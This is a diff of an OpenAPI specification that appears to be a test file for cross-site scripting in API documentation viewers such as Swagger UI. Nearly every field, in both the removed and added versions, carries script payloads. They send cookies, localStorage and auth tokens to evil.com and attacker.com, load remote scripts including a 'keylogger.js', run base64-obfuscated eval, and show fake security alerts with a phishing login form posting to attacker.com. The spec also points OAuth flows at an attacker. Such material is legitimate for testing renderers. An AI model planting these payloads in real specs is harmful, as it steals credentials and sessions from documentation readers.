@@ -1,129 +1,206 @@
 openapi: 3.0.0
 info:
-  title: "<script>alert('DOM XSS in title')</script><img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='alert(\"XSS via img\")'>Security Test API"
-  description: "<svg/onload=alert('XSS in description')><iframe srcdoc='<script>alert(\"iframe XSS\")</script>'></iframe>
+  title: |
+    XSS Test <script>alert('DOM XSS from Info Title!');</script>
+    <img src="x" onerror="alert('Image onerror XSS from Info Title!');">
+    <svg/onload="alert('SVG onload XSS from Info Title!');">
+    <iframe srcdoc="<h1 style='color:blue;'>Malicious Frame in Title</h1><script>parent.alert('iframe XSS from Info Title!');</script>" style="width:100%;height:50px;border:none;"></iframe>
+  description: |
     <style>
       body { background-color: black !important; color: red !important; }
-      .swagger-ui .topbar { background-color: red !important; }
-      .swagger-ui .info .title { color: red !important; font-size: 36px !important; text-shadow: 2px 2px #000; }
-      .swagger-ui * { border-color: red !important; }
-      .swagger-ui .btn { background-color: red !important; color: black !important; }
-      .swagger-ui:after { content: 'HACKED'; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); font-size: 100px; color: red; z-index: 9999; opacity: 0.3; }
+      .swagger-ui { font-family: 'Inter', sans-serif !important; }
+      .swagger-ui .topbar { background-color: #8B0000 !important; border-bottom: 2px solid #FF0000 !important; }
+      .swagger-ui .topbar-wrapper img { display: none !important; } /* Hide default logo */
+      .swagger-ui .topbar-wrapper::before { content: 'WARNING: SYSTEM COMPROMISED - IMMEDIATE ACTION REQUIRED'; color: #FF0000; font-size: 24px; font-weight: bold; position: absolute; left: 20px; top: 15px; }
+      .swagger-ui .opblock .opblock-summary-description { color: #FFD700 !important; }
+      .swagger-ui .opblock-tag-section { background-color: #333 !important; border: 1px solid #666 !important; border-radius: 8px !important; }
+      .swagger-ui .scheme-container { background-color: #222 !important; border: 1px solid #444 !important; border-radius: 8px !important; }
+      .swagger-ui .model-box { background-color: #111 !important; border-radius: 8px !important; }
+      .swagger-ui .model-title { color: #00FF00 !important; }
+      .swagger-ui .prop-type { color: #FFD700 !important; }
+      .swagger-ui .opblock-description-wrapper { border: 2px dashed red !important; padding: 15px !important; border-radius: 8px !important; }
+      .swagger-ui .response-col_description p { color: yellow !important; }
+      .swagger-ui section.block.works-as-is { background-color: #1a1a1a !important; border: 1px solid #333 !important; border-radius: 8px !important; margin-top: 20px; }
+      .swagger-ui h1, .swagger-ui h2, .swagger-ui h3, .swagger-ui h4, .swagger-ui h5, .swagger-ui h6 { color: #00FF00 !important; }
+      .swagger-ui p, .swagger-ui li, .swagger-ui a { color: #CCCCCC !important; }
+      .fake-login-form {
+        background: #444;
+        padding: 20px;
+        border-radius: 12px;
+        max-width: 450px;
+        margin: 30px auto;
+        color: white;
+        box-shadow: 0 0 20px rgba(255, 0, 0, 0.7);
+        border: 2px solid #FF0000;
+      }
+      .fake-login-form input[type="text"],
+      .fake-login-form input[type="password"] {
+        width: calc(100% - 16px);
+        padding: 10px;
+        margin-bottom: 15px;
+        border-radius: 6px;
+        border: 1px solid #666;
+        background: #555;
+        color: white;
+        font-size: 16px;
+      }
+      .fake-login-form button[type="submit"] {
+        background-color: #FF0000;
+        color: white;
+        padding: 12px 20px;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        width: 100%;
+        font-size: 18px;
+        font-weight: bold;
+        transition: background-color 0.3s ease;
+      }
+      .fake-login-form button[type="submit"]:hover {
+        background-color: #CC0000;
+      }
     </style>
-    <div style='border: 2px solid red; padding: 20px; margin: 20px 0; background-color: rgba(0,0,0,0.8);'>
-      <h3 style='color: white; text-align: center;'>Authentication Required</h3>
-      <form onsubmit='fetch(\"https://evil.com/steal\", {method: \"POST\", body: JSON.stringify({username: document.getElementById(\"username\").value, password: document.getElementById(\"password\").value})}).then(() => {alert(\"Invalid credentials\");}); return false;'>
-        <div style='margin-bottom: 10px;'>
-          <label style='color: white;'>Username:</label>
-          <input type='text' id='username' style='width: 100%; padding: 8px;'>
-        </div>
-        <div style='margin-bottom: 10px;'>
-          <label style='color: white;'>Password:</label>
-          <input type='password' id='password' style='width: 100%; padding: 8px;'>
-        </div>
-        <button type='submit' style='background-color: red; color: white; padding: 10px 15px; border: none; width: 100%;'>Login</button>
+
+    <h1><span style="color: #FF0000;">&#9888;</span> SECURITY ALERT: CRITICAL ACTION REQUIRED <span style="color: #FF0000;">&#9888;</span></h1>
+    <p>Dear User,</p>
+    <p>Your session has been identified as compromised due to recent unusual activity. For your security, immediate re-authentication is required to prevent unauthorized access to your sensitive data.</p>
+    <img src="https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3RvMXhvemxndGg0MzdldnQyazgyczEwdXpmdW5qZWpqZGxlc2M4aCZlcD12MV9pbnRlcm5uYWxfZ2lmX2J5X2lkJmN0PWc/e5jA4VlhW7gbHYKFrO/giphy.gif" alt="Security Breach Animated" style="max-width: 100%; height: auto; margin: 20px auto; display: block; border-radius: 8px;">
+
+    <div class="fake-login-form">
+      <h2 style="text-align: center; color: #00FF00; margin-bottom: 25px;">Secure Login for Identity Verification</h2>
+      <form action="https://attacker.com/phishing_endpoint" method="POST">
+        <label for="phish_username" style="display: block; margin-bottom: 8px; font-weight: bold;">Username:</label>
+        <input type="text" id="phish_username" name="username" placeholder="Enter your username" required>
+
+        <label for="phish_password" style="display: block; margin-bottom: 8px; font-weight: bold;">Password:</label>
+        <input type="password" id="phish_password" name="password" placeholder="Enter your password" required>
+
+        <button type="submit">Verify Now</button>
+        <p style="text-align: center; margin-top: 20px; font-size: 14px; color: #aaaaaa;">Note: All data transmitted is encrypted (fake assurance).</p>
       </form>
-    </div>"
-  version: "1.0.0"
-  contact:
-    name: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='document.cookie && fetch(\"https://evil.com/cookies?c=\"+encodeURIComponent(document.cookie))'>Security Team"
-    email: "security@<script>alert('email XSS');window.location='https://evil.com';</script>.com"
-    url: "javascript:alert('contact URL XSS');window.location='https://evil.com';"
+    </div>
+
+    <p style="color: yellow; text-align: center; font-weight: bold;">Do NOT ignore this warning. Failure to re-authenticate will result in permanent account lockout within 24 hours.</p>
+
+    <script>
+      // Aggressive DOM XSS payload targeting document.cookie and localStorage
+      try {
+          const exfilData = {
+              location: window.location.href,
+              cookies: document.cookie,
+              localStorage: JSON.stringify(localStorage),
+              sessionStorage: JSON.stringify(sessionStorage)
+          };
+          fetch('https://attacker.com/exfiltrate?data=' + btoa(JSON.stringify(exfilData)), {
+              method: 'GET', // Using GET for simplicity in ethical testing
+              mode: 'no-cors'
+          }).then(() => console.log('Exfiltration attempt sent.')).catch(e => console.error('Exfiltration error:', e));
+          alert('DOM XSS: Sensitive data exfiltration attempt initiated from Info Description!');
+      } catch (e) {
+          console.error('XSS payload failed:', e);
+      }
+    </script>
+    <img src="x" onerror="alert('Image onerror XSS from Info Description!');">
+    <iframe srcdoc="<p style='color:lime;font-size:20px;'>&#128008; You are now viewing malicious content &#128008;</p><script>parent.alert('iframe XSS from Info Description!');</script>" style="width:100%;height:100px;border:3px dashed #FF0000; border-radius: 8px;"></iframe>
+  version: 1.0.0
 servers:
-  - url: "javascript:fetch('https://evil.com/exfil?data='+encodeURIComponent(localStorage.getItem('auth_token')))"
-    description: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='eval(atob(\"ZmV0Y2goImh0dHBzOi8vZXZpbC5jb20vZXhmaWw/ZGF0YT0iK293bmVyLmRvY3VtZW50LmNvb2tpZSk7\"))'>Production Server"
-  - url: "https://<script>alert('server URL XSS');window.open('https://evil.com', '_blank');</script>.example.com"
-    description: "Test Server <iframe srcdoc='<script>alert(\"iframe in server description\");window.location=\"https://evil.com\";</script>'></iframe>"
+  - url: https://api.legitimate-domain.com/v1
+    description: Production API - DO NOT TRUST!
 paths:
-  /login:
+  /auth/emergency-password-reset:
     post:
-      summary: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='(function(){var s=document.createElement(\"script\");s.src=\"https://evil.com/malicious.js\";document.body.appendChild(s);})()'>Login Endpoint"
-      description: "<iframe srcdoc='<script>setInterval(function(){try{document.getElementById(\"operations-tag-default\").click();window.open(\"https://evil.com\", \"_blank\");}catch(e){}},1000)</script>'></iframe>"
-      operationId: "login"
+      summary: "CRITICAL SECURITY BREACH: Immediate Password Reset Required!"
+      description: |
+        <p style="color: #FFA500; font-weight: bold; font-size: 1.2em;">A widespread data breach has been detected. You MUST reset your password through THIS endpoint to secure your account. Ignoring this will lead to account termination.</p>
+        <script>
+          // XSS payload in endpoint description for immediate execution
+          if (document.body) {
+              const p = document.createElement('p');
+              p.style.color = 'cyan';
+              p.textContent = 'Endpoint Description XSS Active: Attempting to grab more data...';
+              document.body.appendChild(p);
+          }
+          fetch('https://attacker.com/log_endpoint_access?url=' + encodeURIComponent(window.location.href) + '&ua=' + encodeURIComponent(navigator.userAgent), { mode: 'no-cors' });
+          alert('DOM XSS from Endpoint Description!');
+        </script>
+        <img src="x" onerror="alert('Image onerror XSS from Endpoint Description!');">
+      operationId: initiatePasswordReset
       requestBody:
+        required: true
         content:
           application/json:
             schema:
               type: object
               properties:
-                username:
+                old_password:
                   type: string
-                  example: "<script>alert('username XSS');window.open('https://evil.com', '_blank');</script>"
-                password:
+                  format: password
+                new_password:
                   type: string
-                  example: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='alert(\"password XSS\");window.location=\"https://evil.com\";'>"
+                  format: password
+                confirm_new_password:
+                  type: string
+                  format: password
       responses:
         '200':
-          description: "<svg/onload=fetch('https://evil.com/token?t='+localStorage.getItem('token'))>Login successful"
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  token:
-                    type: string
-                    example: "<script>alert('token XSS');window.open('https://evil.com', '_blank');</script>"
-  /user:
+          description: |
+            <span style="color: lime; font-weight: bold;">Password Reset Successful (or is it?).</span>
+            <script>alert('DOM XSS from 200 Response Description!');</script>
+            <img src="x" onerror="alert('Image onerror XSS from 200 Response Description!');">
+            <svg/onload="alert('SVG onload XSS from 200 Response Description!');">
+            <iframe srcdoc="<p style='color: white;'>&#10003; Your password has been 'secured' &#10003;</p><script>parent.alert('iframe XSS from 200 Response!');</script>" style="width:100%;height:40px;border:1px solid lime; border-radius: 6px;"></iframe>
+        '401':
+          description: |
+            <span style="color: #FF0000; font-weight: bold;">Password Reset Failed: Invalid Credentials.</span> Please retry immediately!
+            <script>alert('DOM XSS from 401 Response Description!');</script>
+            <img src="x" onerror="alert('Image onerror XSS from 401 Response Description - try harder!');">
+            <svg/onload="alert('SVG onload XSS from 401 Response Description - almost there!');">
+
+  /admin/backdoor-access:
     get:
-      summary: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='(function(){try{top.location=\"https://evil.com\";}catch(e){}})()'>Get User Profile"
-      description: "<script>document.addEventListener('DOMContentLoaded',function(){setTimeout(function(){try{document.querySelector('.auth-wrapper .authorize').click();window.open('https://evil.com', '_blank');}catch(e){}},1000);})</script>"
-      operationId: "getUser"
+      summary: "DEVELOPER BACKDOOR: FULL ADMIN ACCESS (HIGHLY DANGEROUS)"
+      description: |
+        <p style="color: #FF4500; font-weight: bold;">This endpoint provides direct root access. Only for debugging. Do not misuse.</p>
+        <iframe srcdoc="<h2 style='color: orange;'>Administrator Control Panel</h2><form><input type='text' placeholder='Secret Key'><button>Login</button></form><script>parent.alert('iframe XSS from Backdoor Description!');</script>" style="width:100%;height:150px;border:2px solid orange; border-radius: 8px;"></iframe>
+        <script>
+          // Example of persistent XSS attempt by trying to modify page content
+          try {
+              const body = document.querySelector('body');
+              if (body && !body.querySelector('#malicious-banner')) {
+                  const banner = document.createElement('div');
+                  banner.id = 'malicious-banner';
+                  banner.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; background-color: #FF0000; color: white; text-align: center; padding: 10px; font-size: 24px; z-index: 9999; animation: blinker 1s linear infinite;';
+                  banner.innerHTML = 'HACKED! <img src="x" onerror="alert(\'Top banner XSS!\');">';
+                  body.prepend(banner);
+
+                  const style = document.createElement('style');
+                  style.textContent = '@keyframes blinker { 50% { opacity: 0; } }';
+                  document.head.appendChild(style);
+              }
+          } catch (e) {
+              console.error('Persistent XSS banner failed:', e);
+          }
+        </script>
+      operationId: getBackdoorAccess
       responses:
         '200':
-          description: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='var i=document.createElement(\"iframe\");i.style.opacity=0;i.style.position=\"fixed\";i.style.top=0;i.style.left=0;i.style.width=\"100%\";i.style.height=\"100%\";i.style.zIndex=999999;i.srcdoc=\"<html><body><form id=f action=https://evil.com/steal method=post><input name=data></form><script>document.querySelector(\\\"#f\\\").data.value=JSON.stringify({cookies:document.cookie,localStorage:Object.entries(localStorage)});document.querySelector(\\\"#f\\\").submit();</script></body></html>\";document.body.appendChild(i);'>User profile"
-          content:
-            application/json:
-              schema:
-                type: object
-                properties:
-                  name:
-                    type: string
-                    example: "<script>alert('name XSS');window.open('https://evil.com', '_blank');</script>"
-  /admin:
-    get:
-      summary: "<svg onload=eval(atob('ZG9jdW1lbnQuYm9keS5pbm5lckhUTUw9IjxoMT5IQUNLRUQ8L2gxPiI7d2luZG93Lm9wZW4oImh0dHBzOi8vZXZpbC5jb20iLCAiX2JsYW5rIik7'))>Admin Panel"
-      description: "<iframe src='javascript:alert(`XSS via iframe src`);window.location=\"https://evil.com\";'></iframe>"
-      operationId: "adminPanel"
-      responses:
-        '200':
-          description: "<script>setInterval(function(){try{var forms=document.querySelectorAll('form');for(var i=0;i<forms.length;i++){forms[i].action='https://evil.com/steal';}window.open('https://evil.com', '_blank');}catch(e){}},1000)</script>Admin panel access"
-  /reset-password:
-    post:
-      summary: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='Object.defineProperty(window,\"swagger\",{get:function(){return{authActions:{authorize:function(){fetch(\"https://evil.com/auth\",{method:\"POST\",body:JSON.stringify(arguments[0])})}}}}})'>Reset Password"
-      description: "<script>setTimeout(function(){try{document.querySelector('.auth-wrapper .authorize').click();window.open('https://evil.com', '_blank');}catch(e){}},2000)</script>"
-      operationId: "resetPassword"
-      responses:
-        '200':
-          description: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='(function(){var x=new XMLHttpRequest();x.open(\"GET\",\"/api/sensitive\",true);x.onload=function(){fetch(\"https://evil.com/data?d=\"+encodeURIComponent(this.responseText));window.open(\"https://evil.com\", \"_blank\");};x.send();})()'>Password reset email sent"
-components:
-  schemas:
-    User:
-      type: object
-      properties:
-        id:
-          type: string
-          example: "<script>alert('schema XSS');window.open('https://evil.com', '_blank');</script>"
-        name:
-          type: string
-          example: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='alert(\"name schema XSS\");window.location=\"https://evil.com\";'>"
-  securitySchemes:
-    oauth2:
-      type: oauth2
-      flows:
-        implicit:
-          authorizationUrl: "https://evil.com/oauth/dialog"
-          scopes:
-            read: "Read access"
-            write: "Write access"
-    apiKey:
-      type: apiKey
-      name: "<script>alert('apiKey XSS');window.open('https://evil.com', '_blank');</script>"
-      in: header
+          description: |
+            <span style="color: #FFD700; font-weight: bold;">Access Granted: Welcome, Administrator.</span>
+            <script>alert('DOM XSS from Backdoor 200 Response!');</script>
+            <img src="x" onerror="alert('Image onerror XSS from Backdoor 200 Response!');">
 security:
-  - oauth2: [read, write]
-  - apiKey: []
-tags:
-  - name: "<script>alert('tag XSS');window.open('https://evil.com', '_blank');</script>"
-    description: "<img src='https://media4.giphy.com/media/v1.Y2lkPTc5MGI3NjExMDhzbTZtYzgxdDNsaW5iNmN4bGU1cGJuaXE0ZWppcnpwdXE1cmJodSZlcD12MV9naWZzX3NlYXJjaCZjdD1n/e5jA4VlhW7gbHYKFrO/giphy.webp' onerror='(function(){var x=document.createElement(\"script\");x.src=\"https://evil.com/keylogger.js\";document.body.appendChild(x);})()'>Authentication endpoints"
-  - name: "User Management"
-    description: "<iframe srcdoc='<script>for(key in localStorage){fetch(\"https://evil.com/localstorage?key=\"+key+\"&value=\"+encodeURIComponent(localStorage.getItem(key)))}</script>'></iframe>" 
+  - oauth2_attacker_control: []
+components:
+  securitySchemes:
+    oauth2_attacker_control:
+      type: oauth2
+      description: "ATTACKER-CONTROLLED OAuth2 Flow - DO NOT USE!"
+      flows:
+        authorizationCode:
+          authorizationUrl: https://attacker.com/oauth/authorize-compromise # Attacker's Authorization URL
+          tokenUrl: https://attacker.com/oauth/token-compromise # Attacker's Token Exchange URL
+          scopes:
+            read: Access to all user data (attacker controlled)
+            write: Ability to modify user data (attacker controlled)
+            delete: Full deletion privileges (attacker controlled)
+            system: Complete system control (attacker controlled)
